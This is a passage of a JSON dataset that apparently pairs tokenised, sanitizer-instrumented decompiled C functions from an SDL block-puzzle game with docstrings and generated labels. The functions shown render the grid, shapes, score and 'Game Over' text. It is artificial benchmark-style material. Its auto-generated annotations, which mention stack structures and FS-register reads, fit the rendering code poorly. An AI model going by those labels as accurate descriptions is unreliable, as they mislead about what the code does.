            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "44",
            ")",
            "=",
            "46",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233F60",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233FA0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233FE0",
            ",",
            "g",
            ")",
            ";",
            "v11",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v11",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v11",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v12",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v11",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v11",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_2364C0",
            ",",
            "v12",
            ")",
            ";",
            "if",
            "(",
            "v12",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234040",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234080",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2340C0",
            ",",
            "g",
            ")",
            ";",
            "v13",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v13",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v13",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ")",
            ";",
            "b",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234120",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234160",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2341A0",
            ",",
            "g",
            ")",
            ";",
            "v14",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v14",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v14",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ")",
            ";",
            "v17",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234200",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234240",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234280",
            ",",
            "g",
            ")",
            ";",
            "v15",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v15",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v15",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ")",
            ";",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "r",
            ",",
            "v17",
            ",",
            "b",
            ",",
            "255L",
            "L",
            ")",
            ";",
            "}",
            "else",
            "{",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "255L",
            "L",
            ")",
            ";",
            "}",
            "SDL_RenderFillRect",
            "(",
            "rend",
            ",",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2345E0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_234620",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2342E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "g",
            "-",
            ">",
            "y",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234340",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "drawShape",
            "(",
            "g",
            "-",
            ">",
            "x",
            ",",
            "y",
            ",",
            "g",
            "-",
            ">",
            "shape",
            ",",
            "rend",
            ")",
            ";",
            "DrawNext",
            "(",
            "g",
            ",",
            "rend",
            ")",
            ";",
            "if",
            "(",
            "v22",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function is likely used to manage and manipulate data structures that resemble a stack, such as for maintaining runtime stack, tree traversal, or execution environment.",
            "The function \"malloc\" is used to allocate memory dynamically during program execution, as demonstrated in the code snippets which implement various algorithms and memory allocation.",
            "The __readfsqword function is used to read a quad-word (64-bit) value from a specific offset in the segment register FS, and its implementation varies based on the architecture (x86 or x64) and the operating system."
        ],
        "longer_label": "The code is a complex function that dynamically allocates memory, manipulates data structures resembling a stack, and includes implementations for reading quad-word values from specific offsets in the segment register FS."
    },
    {
        "id": 231,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "drawText",
            "`",
            "displays",
            "text",
            "on",
            "the",
            "screen",
            "with",
            "different",
            "colors",
            "depending",
            "on",
            "the",
            "type",
            ",",
            "including",
            "the",
            "score",
            "and",
            "level",
            "information",
            ",",
            "``",
            "Game",
            "Over",
            "!",
            ":",
            "(",
            "``",
            "for",
            "type",
            "GO",
            ",",
            "and",
            "``",
            "Congrats",
            "!",
            ":",
            ")",
            "''",
            "for",
            "type",
            "C",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "TTF_Font",
            "*",
            "Font",
            ",",
            "int",
            "type",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "_DWORD",
            "*",
            "v6",
            ";",
            "const",
            "char",
            "*",
            "Error",
            ";",
            "unsigned",
            "int",
            "level",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "int",
            "v14",
            ";",
            "SDL_Surface_0",
            "*",
            "surfaceMessage",
            ";",
            "SDL_Texture_0",
            "*",
            "Message",
            ";",
            "SDL_Surface_0",
            "*",
            "surfaceMessage_1",
            ";",
            "SDL_Texture_0",
            "*",
            "Message_1",
            ";",
            "SDL_Surface_0",
            "*",
            "surfaceMessage_0",
            ";",
            "SDL_Texture_0",
            "*",
            "Message_0",
            ";",
            "char",
            "v24",
            "[",
            "1464",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v25",
            ";",
            "v4",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v24",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v5",
            "=",
            "__asan_stack_malloc_5",
            "(",
            "1440L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v5",
            ")",
            "v4",
            "=",
            "v5",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "8",
            ")",
            "=",
            "\"7 32 4 5 Black 96 4 3 Red 160 4 5 Green 224 16 12 Message_rect 288 16 12 Message_rect 352 16 12 \"",
            "\"Message_rect 416 1000 4 text \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "16",
            ")",
            "=",
            "drawText",
            ";",
            "v6",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v6",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v6",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v6",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v6",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v6",
            "[",
            "536862724",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v6",
            "[",
            "536862725",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v6",
            "[",
            "536862726",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v6",
            "[",
            "536862727",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v6",
            "[",
            "536862728",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v6",
            "[",
            "536862729",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v6",
            "[",
            "536862730",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v6",
            "[",
            "536862731",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v6",
            "[",
            "536862732",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v6",
            "[",
            "536862764",
            "]",
            "=",
            "-",
            "218959360",
            ";",
            "v25",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "32",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "96",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "96",
            ")",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "160",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "162",
            ")",
            "=",
            "-",
            "1",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "198",
            ",",
            "397",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2348A0",
            ",",
            "397L",
            "L",
            ",",
            "198L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "39",
            ",",
            "595",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2348E0",
            ",",
            "595L",
            "L",
            ",",
            "39L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "Font",
            ")",
            "{",
            "Error",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "SDL_GetError",
            "(",
            ")",
            ";",
            "printf",
            "(",
            "\"TTF_OpenFont: %s\\n\"",
            ",",
            "Error",
            ")",
            ";",
            "}",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "1415",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v4",
            "-",
            "121",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "1415",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v4",
            "+",
            "416",
            ",",
            "1000L",
            "L",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "424",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "432",
            ")",
            ",",
            "0",
            ",",
            "0x3D8uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2346A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "level",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234700",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "sprintf",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ",",
            "\"Score: %d  Level: %d\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "g",
            "-",
            ">",
            "score",
            ",",
            "level",
            ")",
            ";",
            "surfaceMessage",
            "=",
            "(",
            "SDL_Surface_0",
            "*",
            ")",
            "TTF_RenderText_Solid",
            "(",
            "Font",
            ",",
            "v4",
            "+",
            "416",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "32",
            ")",
            ")",
            ";",
            "Message",
            "=",
            "(",
            "SDL_Texture_0",
            "*",
            ")",
            "SDL_CreateTextureFromSurface",
            "(",
            "rend",
            ",",
            "surfaceMessage",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "224",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "224",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "224",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "224",
            ")",
            "=",
            "634",
            ";",
            "v9",
            "=",
            "688",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "228",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "-",
            "64",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "228",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "v9",
            "=",
            "v4",
            "+",
            "228",
            ";",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "228",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "228",
            ")",
            "=",
            "v9",
            ";",
            "v10",
            "=",
            "15",
            "*",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "232",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "232",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "232",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "232",
            ")",
            "=",
            "v10",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "236",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "-",
            "64",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "236",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "236",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "236",
            ")",
            "=",
            "48",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "Message",
            ",",
            "0L",
            "L",
            ",",
            "v4",
            "+",
            "224",
            ")",
            ";",
            "SDL_FreeSurface",
            "(",
            "surfaceMessage",
            ")",
            ";",
            "SDL_DestroyTexture",
            "(",
            "Message",
            ")",
            ";",
            "if",
            "(",
            "type",
            "=",
            "=",
            "1",
            ")",
            "{",
            "memcpy",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ",",
            "\"Game Over! :(\"",
            ",",
            "0xEuL",
            "L",
            ")",
            ";",
            "surfaceMessage_0",
            "=",
            "(",
            "SDL_Surface_0",
            "*",
            ")",
            "TTF_RenderText_Solid",
            "(",
            "Font",
            ",",
            "v4",
            "+",
            "416",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "96",
            ")",
            ")",
            ";",
            "Message_0",
            "=",
            "(",
            "SDL_Texture_0",
            "*",
            ")",
            "SDL_CreateTextureFromSurface",
            "(",
            "rend",
            ",",
            "surfaceMessage_0",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "22",
            ",",
            "634",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_234960",
            ",",
            "634L",
            "L",
            ",",
            "22L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
